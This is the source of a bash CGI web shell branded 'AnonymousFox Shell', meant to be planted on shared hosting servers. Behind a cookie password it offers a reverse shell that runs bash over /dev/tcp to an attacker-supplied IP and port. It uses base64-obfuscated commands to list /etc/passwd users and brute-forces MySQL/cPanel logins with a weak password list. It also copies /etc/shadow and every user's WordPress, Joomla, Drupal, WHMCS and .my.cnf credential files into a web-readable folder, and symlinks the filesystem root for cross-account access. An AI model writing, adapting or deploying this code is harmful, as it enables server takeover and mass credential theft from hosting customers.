#!/bin/bash -i

#z181r [z181r]


function cgi_get_POST_vars()
{
    # check content type
    [ "${CONTENT_TYPE}" != "application/x-www-form-urlencoded" ] && \
	echo "Warning: you should probably use MIME type "\
	     "application/x-www-form-urlencoded!" 1>&2
    # save POST variables (only first time this is called)
    [ -z "$QUERY_STRING_POST" \
      -a "$REQUEST_METHOD" = "POST" -a ! -z "$CONTENT_LENGTH" ] && \
	read -n $CONTENT_LENGTH QUERY_STRING_POST
    return
}


function cgi_decodevar()
{
    [ $# -ne 1 ] && return
    local v t h
    
    t="${1//+/ }%%"
    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
	v="${v}${t%%\%*}" 
	t="${t#*%}"       
	
	if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
	    h=${t:0:2} 
	    t="${t:2}" 
	    v="${v}"`echo -e \\\\x${h}` 
	fi
    done
    
    echo "${v}"
    return
}


function cgi_getvars()
{
    [ $# -lt 2 ] && return
    local q p k v s
    # get query
    case $1 in
	GET)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    ;;
	POST)
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
	    ;;
	BOTH)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
	    ;;
    esac
    shift
    s=" $* "
    # parse the query data
    while [ ! -z "$q" ]; do
	p="${q%%&*}"  # get first part of query string
	k="${p%%=*}"  # get the key (variable name) from it
	v="${p#*=}"   # get the value from it
	q="${q#$p&*}" # strip first part from query string
	# decode and evaluate var if requested
	[ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
	    eval "$k=\"`cgi_decodevar \"$v\"`\""
    done
    return
}

# register all GET and POST variables
cgi_getvars BOTH ALL



if [ $cc2 -eq 4 ] ; then
clear
echo -e "Set-Cookie: SAVEDPWD=;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
exit
else

if [ -n "$xx"  ] ; then
echo -e "Set-Cookie: SAVEDPWD=$xx;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
else
echo -e "Content-type: text/html\n\n"
fi

fi
echo 'PGh0bWw+PHRpdGxlPkFub255bW91c0ZveCBTaGVsbDwvdGl0bGU+CjxoZWFkPgo8c3R5bGU+Cgpib2R5CnsKCWJhY2tncm91bmQ6ICMzMzM7Cgljb2xvcjogI0Y1RjVGNTsKCglwYWRkaW5nOiAxMHB4OwoKfQoKCmE6bGluaywgYm9keV9hbGluawp7Cgljb2xvcjogI0ZGOTkzMzsKCXRleHQtZGVjb3JhdGlvbjogbm9uZTsKfQphOnZpc2l0ZWQsIGJvZHlfYXZpc2l0ZWQKewoJY29sb3I6ICNGRjk5MzM7Cgl0ZXh0LWRlY29yYXRpb246IG5vbmU7Cn0KYTpob3ZlciwgYTphY3RpdmUsIGJvZHlfYWhvdmVyCnsKCWNvbG9yOiAjRkZGRkZGOwoJdGV4dC1kZWNvcmF0aW9uOiBub25lOwp9Cgp0ZXh0YXJlYQp7Cglib3JkZXI6IDFweCBzb2xpZDsKCWN1cnNvcjogZGVmYXVsdDsKCQoJYmFja2dyb3VuZDogIzAwMDsKCWNvbG9yOiAjZmZmZmZmOwpib3JkZXI6MXB4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6NXB4IDIwcHg7IApib3JkZXItcmFkaXVzOjI1cHg7Ci1tb3otYm9yZGVyLXJhZGl1czoyNXB4OyAvKiBGaXJlZm94IDMuNiBhbmQgZWFybGllciAqLwoKfQoKaW5wdXQKewoJYm9yZGVyOiAxcHggc29saWQ7CgljdXJzb3I6IGRlZmF1bHQ7CglvdmVyZmxvdzogaGlkZGVuOwoJYmFja2dyb3VuZDogIzAwMDsKCWNvbG9yOiAjZmZmZmZmOwpib3JkZXI6MXB4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6NXB4IDIwcHg7IApib3JkZXItcmFkaXVzOjI1cHg7Ci1tb3otYm9yZGVyLXJhZGl1czoyNXB4OyAvKiBGaXJlZm94IDMuNiBhbmQgZWFybGllciAqLwoKfQppbnB1dC5idXR0b24gewpmb250LWZhbWlseTogQ291cmllciBOZXc7CmNvbG9yOiAjZmZmZmZmOwpmb250LXNpemU6IDE2cHg7CnBhZGRpbmc6IDEwcHg7CnRleHQtZGVjb3JhdGlvbjogbm9uZTsKLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA4cHg7Ci1tb3otYm9yZGVyLXJhZGl1czogOHB4Owotd2Via2l0LWJveC1zaGFkb3c6IDBweCAxcHggM3B4ICNhYmFiYWI7Ci1tb3otYm94LXNoYWRvdzogMHB4IDFweCAzcHggI2FiYWJhYjsKdGV4dC1zaGFkb3c6IDFweCAxcHggM3B4ICM2NjY2NjY7CmJvcmRlcjogc29saWQgI2RlZGJkZSAxcHg7CmJhY2tncm91bmQ6ICM5MDkwOTAgOwp9Ci5idXR0b246aG92ZXIgewpiYWNrZ3JvdW5kOiAjQjBCMEIwOwp9CgogZGl2LmJveAp7CmNvbG9yOiAjMzMzOwpib3JkZXI6M3B4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6MTBweCA0MHB4OyAKYmFja2dyb3VuZDojZThlOGU4Owp3aWR0aDo5NCU7CmJvcmRlci1yYWRpdXM6MjVweDsKLW1vei1ib3JkZXItcmFkaXVzOjI1cHg7IC8qIEZpcmVmb3ggMy42IGFuZCBlYXJsaWVyICovCn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGNlbnRlcj4KPHByZT4KPGNlbnRlcj48YSBocmVmPSJodHRwczovL2Fub255bW91c2ZveC5jby8iPjxpbWcgc3JjPSJodHRwczovL2Fub255bW91c2ZveC5teC9fQGltYWdlcy9sb2dvMi5wbmciPjwvYT48L2NlbnRlcj4KPC9wcmU+Cgo8ZGl2IGFsaWduPSJjZW50ZXIiPg==' | base64 -d





    echo "$HTTP_COOKIE" | grep -qi "$pass"
    if [ $? == 0 ]
    then
    echo ""
    else
login
exit
    fi
	

echo 'PHRhYmxlIGJvcmRlcj0wPjx0cj48dGQ+PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IAo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4gCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4JCTxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiIG5hbWU9ImJ1dHRvbiIgdmFsdWU9IiAgIEhvbWUgICAgIiAvPgoJPC9mb3JtPgoJPC90ZD48dGQ+Cgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4JPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2MyIiB2YWx1ZT0iMSIgIC8+IAk8aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSJidXR0b24iIHZhbHVlPSIgICBTaG93IFVzZXIgICAgIiAvPgoJPC9mb3JtPgo8L3RkPgo8dGQ+Cjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgoJCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNjMiIgdmFsdWU9IjIiICAvPgoJCTxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiIG5hbWU9ImJ1dHRvbiIgdmFsdWU9IiBTaG93ICAgRG9tYWlucyAiIC8+Cgk8L2Zvcm0+CjwvdGQ+Cjx0ZD4KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+CgkKCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2MyIiB2YWx1ZT0iMyIgIC8+CgkKCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidXR0b24iIG5hbWU9ImJ1dHRvbiIgdmFsdWU9IlN5bUxpbmsgLi4vRm94LVN5bSIgLz4KCTwvZm9ybT4KPC90ZD4KCjx0ZD4KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+CgkKCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2MyIiB2YWx1ZT0iMzMiICAvPgoJCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV0dG9uIiBuYW1lPSJidXR0b24iIHZhbHVlPSJDb3B5IC4uL0ZveC1Db3B5IiAvPgoJPC9mb3JtPgo8L3RkPgoKPHRkPgo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KCQoJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+Cgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSI1IiAgLz4KCQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1dHRvbiIgbmFtZT0iYnV0dG9uIiB2YWx1ZT0iY1BhbmVsLWNyYWNrZXIiIC8+Cgk8L2Zvcm0+CjwvdGQ+Cgo8dGQ+Cjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgoJCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNjMiIgdmFsdWU9IjciICAvPgoJCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV0dG9uIiBuYW1lPSJidXR0b24iIHZhbHVlPSJCQUNLLUNPTk5FQ1QiIC8+Cgk8L2Zvcm0+CjwvdGQ+CjwvdHI+PC90YWJsZT4KIAo8L2Rpdj4KCjwvY2VudGVyPg==' | base64 -d
if [ $cc2 -eq 7 ] ; then
echo '<br><form method="post" action="">
	
	<form method="post" action="">
	<div align="center">'
echo 'IP <input type="text" name="bip" size="50" value="';echo $REMOTE_ADDR;echo '"/><br>
Port <input type="text" name="bport" size="50" value="443"/></form><br><br>
<input type="hidden" name="cc2" value="8"  /><br>
<input type="submit" class="button" name="button" value="CONNECT" />'
echo "<br><br><hr><center>"
fi
if [ $cc2 -eq 8 ] ; then
bash -i >& /dev/tcp/$bip/$bport 0>&1
fi
if [ $cc2 -eq 6 ] ; then
echo '<pre>'



arr1=$(echo $listu | tr "\r" "\n")
arr2=$(echo $listp | tr "\r" "\n")
echo "<table border='0' width='100%'><tr><td align='center'><div class='box' align='left'><xmp>"
for x in $arr1
do
for y in $arr2
do
mysql -u$x -p$y  ;

if [ $? -eq 0 ] ; then
echo "Found Cpanel User $x Password ($y)"
fi

done
done
echo "</xmp></div></pre></td></tr></table>"
fi
if [ $cc2 -eq 5 ] ; then
echo '<form method="post" action="">
	<center> 
	<form method="post" action="">
Users
<br>
<textarea name="listu" cols="50" rows="15">'
eval `echo Y2F0IC9ldGMvcGFzc3dkIHxncmVwIC9ob21lIHxjdXQgLWQiOiIgLWYxIA== | base64 -d`;echo '</textarea>
<br>
Password
<br>
<textarea name="listp" cols="50" rows="15">123
1234
12345
123456
1234567
123456789
1234567890
123123
123321</textarea>

	<input type="hidden" name="cc2" value="6"  />
	<br>
	<br>
	<input type="submit" class="button" name="button" value="Send" />
	</form>
	<center>
'

fi





if [ $cc2 -eq 1 ] ; then
echo '<div align="center">'
echo "<xmp>"
eval `echo Y2F0IC9ldGMvcGFzc3dkIHxncmVwIC9ob21lIHxjdXQgLWQiOiIgLWYxIA== | base64 -d`
echo "</xmp>"
echo "</div>"
fi

if [ $cc2 -eq 2 ] ; then
echo "<br><center><table border='1' width='45%' cellspacing='0' bordercolor='#a3a3a3' cellpadding='0' align='center'><tr><td bgcolor='#000000' align='center'>Domain</td><td align='center' bgcolor='#000000'>User</td></tr>"

for i in `cat /etc/named.conf | uniq |grep '^zone' |grep -v '"."' |grep -v '"0.0.127.in-addr.arpa"' |cut -d ' ' -f 2  |cut -d '"' -f 2| sort | uniq `; do echo "<td align='center'>$i</td><td align='center'>" ; ls -dl /etc/valiases/$i |cut -d ' ' -f 3 ; echo "</td></tr>"; done

echo "</table></center><br>"
fi
if [ $cc2 -eq 33 ] ; then
echo "<xmp>"
mkdir ../z181r-Copy
 echo 'DirectoryIndex ssssss.htm' >> ../z181r-Copy/.htaccess 
 echo 'AddType txt .php' >> ../z181r-Copy/.htaccess 
 echo 'AddHandler txt .php' >> ../z181r-Copy/.htaccess 
 echo 'AddType txt .html' >> ../z181r-Copy/.htaccess 
 echo 'AddHandler txt .html' >> ../z181r-Copy/.htaccess 
 echo 'Options all' >> ../z181r-Copy/.htaccess 
 echo 'ReadmeName z181r.txt' >> ../z181r-Copy/.htaccess
 echo 'Q29kZWQgYnkgQW5vbnltb3VzRm94IDsp'| base64 -d > ../z181r-Copy/z181r.txt
for i in `cd /etc ;cat passwd |grep /home |cut -d":" -f1` ; do
eval "cp /home/$i/public_html/.accesshash ../z181r-Copy/$i-public_html-accesshash-WHMCS.txt";
eval "cp /home/$i/.accesshash ../z181r-Copy/$i-accesshash-WHMCS.txt";
eval "cp /home/$i/public_html/members/configuration.php ../z181r-Copy/$i-members-public_html.txt";
eval "cp /home/$i/members/configuration.php ../z181r-Copy/$i-members.txt";
eval "cp /home/$i/public_html/member/configuration.php ../z181r-Copy/$i-member-public_html.txt";
eval "cp /home/$i/member/configuration.php ../z181r-Copy/$i-member.txt";
eval "cp /home/$i/public_html/client/configuration.php ../z181r-Copy/$i-client-public_html.txt";
eval "cp /home/$i/client/configuration.php ../z181r-Copy/$i-client.txt";
eval "cp /home/$i/public_html/clients/configuration.php ../z181r-Copy/$i-clients-public_html.txt";
eval "cp /home/$i/public_html/order/configuration.php ../z181r-Copy/$i-order-public_html.txt";
eval "cp /home/$i/public_html/core/configuration.php ../z181r-Copy/$i-core-public_html.txt";
eval "cp /home/$i/public_html/host/configuration.php ../z181r-Copy/$i-host-public_html.txt";
eval "cp /home/$i/public_html/hosting/configuration.php ../z181r-Copy/$i-hosting-public_html.txt";
eval "cp /home/$i/order/configuration.php ../z181r-Copy/$i-order-WHMCS.txt";
eval "cp /home/$i/core/configuration.php ../z181r-Copy/$i-core-WHMCS.txt";
eval "cp /home/$i/host/configuration.php ../z181r-Copy/$i-host-WHMCS.txt";
eval "cp /home/$i/hosting/configuration.php ../z181r-Copy/$i-hosting-WHMCS.txt";
eval "cp /home/$i/clients/configuration.php ../z181r-Copy/$i-clients.txt";
eval "cp /home/$i/public_html/clientarea/configuration.php ../z181r-Copy/$i-clientarea-public_html.txt";
eval "cp /home/$i/clientarea/configuration.php ../z181r-Copy/$i-clientarea.txt";
eval "cp /home/$i/public_html/billing/configuration.php ../z181r-Copy/$i-billing-public_html.txt";
eval "cp /home/$i/billing/configuration.php ../z181r-Copy/$i-billing.txt";
eval "cp /home/$i/public_html/billings/configuration.php ../z181r-Copy/$i-billings-public_html.txt";
eval "cp /home/$i/billings/configuration.php ../z181r-Copy/$i-billings.txt";
eval "cp /home/$i/public_html/whmcs/configuration.php ../z181r-Copy/$i-whmcs-public_html.txt";
eval "cp /home/$i/whmcs/configuration.php ../z181r-Copy/$i-whmcs.txt";
eval "cp /home/$i/public_html/whm/configuration.php ../z181r-Copy/$i-whm-public_html.txt";
eval "cp /home/$i/whm/configuration.php ../z181r-Copy/$i-whm.txt";
eval "cp /home/$i/public_html/whmc/configuration.php ../z181r-Copy/$i-whmc-public_html.txt";
eval "cp /home/$i/whmc/configuration.php ../z181r-Copy/$i-whmc.txt";
eval "cp /home/$i/public_html/support/configuration.php ../z181r-Copy/$i-support-public_html.txt";
eval "cp /home/$i/support/configuration.php ../z181r-Copy/$i-support.txt";
eval "cp /home/$i/public_html/supports/configuration.php ../z181r-Copy/$i-supports-public_html.txt";
eval "cp /home/$i/supports/configuration.php ../z181r-Copy/$i-supports.txt";
eval "cp /home/$i/public_html/my/configuration.php ../z181r-Copy/$i-my-public_html.txt";
eval "cp /home/$i/my/configuration.php ../z181r-Copy/$i-my.txt";
eval "cp /home/$i/public_html/portal/configuration.php ../z181r-Copy/$i-portal-public_html.txt";
eval "cp /home/$i/portal/configuration.php ../z181r-Copy/$i-portal.txt";
eval "cp /home/$i/public_html/clientarea/configuration.php ../z181r-Copy/$i-clientarea.txt";
eval "cp /home/$i/public_html/clients/configuration.php ../z181r-Copy/$i-client.txt";
eval "cp /home/$i/public_html/billing/configuration.php ../z181r-Copy/$i-billing.txt";
eval "cp /home/$i/public_html/billings/configuration.php ../z181r-Copy/$i-billings.txt";
eval "cp /home/$i/public_html/whmcs/configuration.php ../z181r-Copy/$i-whmcs2.txt";
eval "cp /home/$i/public_html/portal/configuration.php ../z181r-Copy/$i-whmcs3.txt";
eval "cp /home/$i/public_html/my/configuration.php ../z181r-Copy/$i-whmcs4.txt";
eval "cp /home/$i/public_html/whm/configuration.php ../z181r-Copy/$i-whm.txt";
eval "cp /home/$i/public_html/whmc/configuration.php ../z181r-Copy/$i-whmc.txt";
eval "cp /home/$i/public_html/support/configuration.php ../z181r-Copy/$i-support.txt";
eval "cp /home/$i/public_html/supports/configuration.php ../z181r-Copy/$i-supports.txt";
eval "cp /home/$i/public_html/vb/includes/config.php ../z181r-Copy/$i-vb.txt";
eval "cp /home/$i/public_html/includes/config.php ../z181r-Copy/$i-vb2.txt";
eval "cp /home/$i/public_html/config.php ../z181r-Copy/$i-2.txt";
eval "cp /home/$i/public_html/forum/includes/config.php ../z181r-Copy/$i-forum.txt";
eval "cp /home/$i/public_html/forums/includes/config.php ../z181r-Copy/$i-forums.txt";
eval "cp /home/$i/public_html/admin/conf.php ../z181r-Copy/$i-5.txt";
eval "cp /home/$i/public_html/admin/config.php ../z181r-Copy/$i-4.txt";
eval "cp /home/$i/public_html/configuration.php ../z181r-Copy/$i-joomla.txt";
eval "cp /home/$i/public_html/joomla/configuration.php ../z181r-Copy/$i-joomla-joomla.txt";
eval "cp /home/$i/public_html/new/configuration.php ../z181r-Copy/$i-joomla-new.txt";
eval "cp /home/$i/public_html/old/configuration.php ../z181r-Copy/$i-joomla-old.txt";
eval "cp /home/$i/public_html/web/configuration.php ../z181r-Copy/$i-joomla-web.txt";
eval "cp /home/$i/public_html/portal/configuration.php ../z181r-Copy/$i-joomla-portal.txt";
eval "cp /home/$i/public_html/site/configuration.php ../z181r-Copy/$i-joomla-site.txt";
eval "cp /home/$i/public_html/test/configuration.php ../z181r-Copy/$i-joomla-test.txt";
eval "cp /home/$i/public_html/demo/configuration.php ../z181r-Copy/$i-joomla-demo.txt";
eval "cp /home/$i/public_html/sites/default/settings.php ../z181r-Copy/$i-drupal.txt";
eval "cp /home/$i/public_html/drupal/sites/default/settings.php ../z181r-Copy/$i-drupal2.txt";
eval "cp /home/$i/public_html/wp-config.php ../z181r-Copy/$i-wordpress.txt";
eval "cp /home/$i/public_html/blog/wp-config.php ../z181r-Copy/$i-wordpress-blog.txt";
eval "cp /home/$i/public_html/blogs/wp-config.php ../z181r-Copy/$i-wordpress-blogs.txt";
eval "cp /home/$i/public_html/wp/wp-config.php ../z181r-Copy/$i-wordpress-wp.txt";
eval "cp /home/$i/public_html/beta/wp-config.php ../z181r-Copy/$i-wordpress-beta.txt";
eval "cp /home/$i/public_html/wordpress/wp-config.php ../z181r-Copy/$i-wordpress-wordpress.txt";
eval "cp /home/$i/public_html/new/wp-config.php ../z181r-Copy/$i-wordpress-new.txt";
eval "cp /home/$i/public_html/old/wp-config.php ../z181r-Copy/$i-wordpress-old.txt";
eval "cp /home/$i/public_html/demo/wp-config.php ../z181r-Copy/$i-wordpress-demo.txt";
eval "cp /home/$i/public_html/test/wp-config.php ../z181r-Copy/$i-wordpress-test.txt";
eval "cp /home/$i/public_html/site/wp-config.php ../z181r-Copy/$i-wordpress-site.txt";
eval "cp /home/$i/public_html/web/wp-config.php ../z181r-Copy/$i-wordpress-web.txt";
eval "cp /home/$i/public_html/portal/wp-config.php ../z181r-Copy/$i-wordpress-portal.txt";
eval "cp /home/$i/public_html/conf_global.php ../z181r-Copy/$i-6.txt";
eval "cp /home/$i/public_html/include/db.php ../z181r-Copy/$i-7.txt";
eval "cp /home/$i/public_html/connect.php ../z181r-Copy/$i-8.txt";
eval "cp /home/$i/public_html/mk_conf.php ../z181r-Copy/$i-9.txt";
eval "cp /home/$i/public_html/include/config.php ../z181r-Copy/$i-10.txt";
eval "cp /etc/passwd ../z181r-Copy/passwd.txt";
eval "cp /etc/shadow ../z181r-Copy/shadow.txt";
eval "cp /etc/named.conf ../z181r-Copy/named.conf.txt";
eval "cp /home/$i/.my.cnf ../z181r-Copy/$i-cPanel.txt" ;
done
echo 'PC94bXA+PGRpdiBhbGlnbj0nY2VudGVyJz48YnI+IFN5bUxpbmtzIDxhIHRhcmdldD0nX2JsYW5rJyBocmVmPScuLi9Gb3gtQ29weSc+Q2xpY2sgaGVyZTwvYT4gPC9kaXY+' | base64 -d
fi
if [ $cc2 -eq 3 ] ; then
echo "<xmp>"
mkdir ../z181r-Sym
mkdir ../z181r-Sym/z181rRoot
mkdir ../z181r-Sym/z181rConfig
mkdir ../z181r-Sym/z181rConfig/WordPress
mkdir ../z181r-Sym/z181rConfig/Joomla
mkdir ../z181r-Sym/z181rConfig/Drupal
mkdir ../z181r-Sym/z181rConfig/Other
mkdir ../z181r-Sym/z181rConfig/WHMCS
mkdir ../z181r-Sym/z181rJump
mkdir ../z181r-Sym/z181rUpload
mkdir ../z181r-Sym/z181rHtaccess
mkdir ../z181r-Sym/z181rContactEmail
mkdir ../z181r-Sym/z181rData
mkdir ../z181r-Sym/z181rData/z181rSDU
mkdir ../z181r-Sym/z181rData/cPanel 
 echo 'DirectoryIndex ssssss.htm' >> ../z181r-Sym/.htaccess 
 echo 'AddType txt .php' >> ../z181r-Sym/.htaccess 
 echo 'AddHandler txt .php' >> ../z181r-Sym/.htaccess 
 echo 'AddType txt .html' >> ../z181r-Sym/.htaccess 
 echo 'AddHandler txt .html' >> ../z181r-Sym/.htaccess 
 echo 'Options all' >> ../z181r-Sym/.htaccess 
 echo 'ReadmeName z181r.txt' >> ../z181r-Sym/.htaccess
 echo 'Q29kZWQgYnkgQW5vbnltb3VzRm94IDsp'| base64 -d > ../z181r-Sym/z181r.txt
 echo 'ReadmeName ../z181r.txt' >> ../z181r-Sym/z181rRoot/.htaccess
 echo 'ReadmeName ../z181r.txt' >> ../z181r-Sym/z181rConfig/.htaccess
 echo 'ReadmeName ../../z181r.txt' >> ../z181r-Sym/z181rConfig/WordPress/.htaccess
 echo 'ReadmeName ../../z181r.txt' >> ../z181r-Sym/z181rConfig/Joomla/.htaccess
 echo 'ReadmeName ../../z181r.txt' >> ../z181r-Sym/z181rConfig/Drupal/.htaccess
 echo 'ReadmeName ../../z181r.txt' >> ../z181r-Sym/z181rConfig/WHMCS/.htaccess 
 echo 'ReadmeName ../../z181r.txt' >> ../z181r-Sym/z181rConfig/Other/.htaccess
 echo 'ReadmeName ../z181r.txt' >> ../z181r-Sym/z181rJump/.htaccess
 echo 'ReadmeName ../z181r.txt' >> ../z181r-Sym/z181rUpload/.htaccess
 echo 'ReadmeName ../z181r.txt' >> ../z181r-Sym/z181rHtaccess/.htaccess
 echo 'ReadmeName ../z181r.txt' >> ../z181r-Sym/z181rContactEmail/.htaccess
 echo 'ReadmeName ../z181r.txt' >> ../z181r-Sym/z181rData/.htaccess
 echo 'ReadmeName ../../z181r.txt' >> ../z181r-Sym/z181rData/z181rSDU/.htaccess
 echo 'ReadmeName ../../z181r.txt' >> ../z181r-Sym/z181rData/cPanel/.htaccess
for i in `cd /etc ;cat passwd |grep /home |cut -d":" -f1` ; do
eval "ln -s / ../z181r-Sym/z181rRoot/r00t" ;
eval "ln -s /home/$i/public_html/ ../z181r-Sym/z181rJump/0-$i" ;
eval "ln -s /home/$i/public_html/.accesshash ../z181r-Sym/z181rConfig/WHMCS/$i-public_html-accesshash-WHMCS.txt";
eval "ln -s /home/$i/.accesshash ../z181r-Sym/z181rConfig/WHMCS/$i-accesshash-WHMCS.txt";
eval "ln -s /home/$i/public_html/members/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-members-public_html.txt";
eval "ln -s /home/$i/members/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-members.txt";
eval "ln -s /home/$i/public_html/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-configuration-WHMCS.txt";
eval "ln -s /home/$i/public_html/order/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-order-public_html.txt";
eval "ln -s /home/$i/public_html/core/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-core-public_html.txt";
eval "ln -s /home/$i/public_html/host/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-host-public_html.txt";
eval "ln -s /home/$i/public_html/hosting/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-hosting-public_html.txt";
eval "ln -s /home/$i/public_html/manage/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-manage-public_html.txt";
eval "ln -s /home/$i/manage/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-manage.txt";
eval "ln -s /home/$i/order/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-order-WHMCS.txt";
eval "ln -s /home/$i/core/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-core-WHMCS.txt";
eval "ln -s /home/$i/host/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-host-WHMCS.txt";
eval "ln -s /home/$i/domains/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-domains-WHMCS.txt";
eval "ln -s /home/$i/public_html/domains/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-domains-public_html.txt";
eval "ln -s /home/$i/hosting/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-hosting-WHMCS.txt";
eval "ln -s /home/$i/public_html/member/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-member-public_html.txt";
eval "ln -s /home/$i/public_html/clientes/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-clientes-public_html.txt";
eval "ln -s /home/$i/clientes/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-clientes.txt";
eval "ln -s /home/$i/member/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-member.txt";
eval "ln -s /home/$i/public_html/client/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-client-public_html.txt";
eval "ln -s /home/$i/client/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-client.txt";
eval "ln -s /home/$i/public_html/clients/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-clients-public_html.txt";
eval "ln -s /home/$i/clients/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-clients.txt";
eval "ln -s /home/$i/public_html/clientarea/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-clientarea-public_html.txt";
eval "ln -s /home/$i/clientarea/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-clientarea.txt";
eval "ln -s /home/$i/public_html/billing/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-billing-public_html.txt";
eval "ln -s /home/$i/billing/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-billing.txt";
eval "ln -s /home/$i/public_html/billings/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-billings-public_html.txt";
eval "ln -s /home/$i/billings/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-billings.txt";
eval "ln -s /home/$i/public_html/whmcs/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-whmcs-public_html.txt";
eval "ln -s /home/$i/whmcs/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-whmcs.txt";
eval "ln -s /home/$i/public_html/whm/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-whm-public_html.txt";
eval "ln -s /home/$i/whm/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-whm.txt";
eval "ln -s /home/$i/public_html/whmc/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-whmc-public_html.txt";
eval "ln -s /home/$i/whmc/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-whmc.txt";
eval "ln -s /home/$i/public_html/support/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-support-public_html.txt";
eval "ln -s /home/$i/support/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-support.txt";
eval "ln -s /home/$i/public_html/supports/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-supports-public_html.txt";
eval "ln -s /home/$i/supports/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-supports.txt";
eval "ln -s /home/$i/public_html/my/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-my-public_html.txt";
eval "ln -s /home/$i/my/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-my.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-portal-public_html.txt";
eval "ln -s /home/$i/portal/configuration.php ../z181r-Sym/z181rConfig/WHMCS/$i-portal.txt";
eval "ln -s /home/$i/public_html/clientarea/configuration.php ../z181r-Sym/z181rConfig/Other/$i-clientarea.txt";
eval "ln -s /home/$i/public_html/clients/configuration.php ../z181r-Sym/z181rConfig/Other/$i-client.txt";
eval "ln -s /home/$i/public_html/billing/configuration.php ../z181r-Sym/z181rConfig/Other/$i-billing.txt";
